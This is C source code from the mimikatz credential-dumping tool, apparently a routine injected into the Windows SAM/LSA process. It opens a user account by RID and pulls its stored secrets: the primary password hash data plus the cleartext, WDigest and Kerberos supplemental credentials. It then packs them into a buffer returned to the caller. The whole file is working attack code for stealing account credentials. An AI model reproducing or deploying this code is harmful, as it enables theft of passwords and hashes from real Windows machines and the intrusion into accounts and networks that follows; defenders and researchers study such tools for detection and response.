/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_sekurlsa_samsrv.h"

PCWCHAR SUPPCRED_TYPE[] = {L"Primary", L"CLEARTEXT", L"WDigest", L"Kerberos", L"Kerberos-Newer-Keys",};
DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
{
	SAMPR_HANDLE hSam, hDomain, hUser;
	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
	LSA_UNICODE_STRING Name;
	DWORD i, credSize = 0;
	LSA_SUPCREDENTIALS_BUFFERS buffers[sizeof(SUPPCRED_TYPE) / sizeof(PCWCHAR)];

	if(NT_SUCCESS(SamIConnect(NULL, &hSam, 0x10000000, TRUE)))
	{
		if(NT_SUCCESS(LsaIQueryInformationPolicyTrusted(PolicyAccountDomainInformation, (PVOID *)(&pPolicyDomainInfo))))
		{
			if(NT_SUCCESS(SamrOpenDomain(hSam, 0x10000000, pPolicyDomainInfo->DomainSid, &hDomain)))
			{
				if(NT_SUCCESS(SamrOpenUser(hDomain, 0x10000000, *(PDWORD) lpParameter->inputData, &hUser)))
				{
					for(i = 0; i < sizeof(SUPPCRED_TYPE) / sizeof(PCWCHAR); i++)
					{
						buffers[i].Buffer = NULL;
						buffers[i].credential.size = 0;
						buffers[i].credential.type = i;
						buffers[i].status = STATUS_ABANDONED;

						if(i)
						{
							RtlInitUnicodeString(&Name, SUPPCRED_TYPE[i]);
							buffers[i].status = SamIRetrievePrimaryCredentials(hUser, &Name, &buffers[i].Buffer, &buffers[i].credential.size);
						}
						else
						{
							buffers[i].credential.size = sizeof(SAMPR_USER_INTERNAL1_INFORMATION);
							buffers[i].status = SamrQueryInformationUser(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER *) &buffers[i].Buffer);
						}
						if(NT_SUCCESS(buffers[i].status) && buffers[i].Buffer && buffers[i].credential.size)
							credSize += buffers[i].credential.size;
					}

					lpParameter->outputSize = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
					if(lpParameter->outputData = VirtualAlloc(NULL, lpParameter->outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
					{
						credSize = 0;
						((PLSA_SUPCREDENTIALS) lpParameter->outputData)->count = sizeof(SUPPCRED_TYPE) / sizeof(PCWCHAR);
						for(i = 0; i < sizeof(SUPPCRED_TYPE) / sizeof(PCWCHAR); i++)
						{
							if(NT_SUCCESS(buffers[i].status))
							{
								if(buffers[i].Buffer && buffers[i].credential.size)
								{
									buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (sizeof(SUPPCRED_TYPE) / sizeof(PCWCHAR)) * sizeof(LSA_SUPCREDENTIAL) + credSize;
									((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
									RtlCopyMemory((PBYTE) lpParameter->outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
									credSize += buffers[i].credential.size;
								}

								if(i)
									LocalFree(buffers[i].Buffer);
								else
									SamIFree_SAMPR_USER_INFO_BUFFER((PSAMPR_USER_INFO_BUFFER) buffers[i].Buffer, UserInternal1Information);
							}
						}
					}

					SamrCloseHandle(&hUser);
				}
				SamrCloseHandle(&hDomain);
			}
			LsaIFree_LSAPR_POLICY_INFORMATION(PolicyAccountDomainInformation, pPolicyDomainInfo);
		}
		SamrCloseHandle(&hSam);
	}
	return STATUS_SUCCESS;
}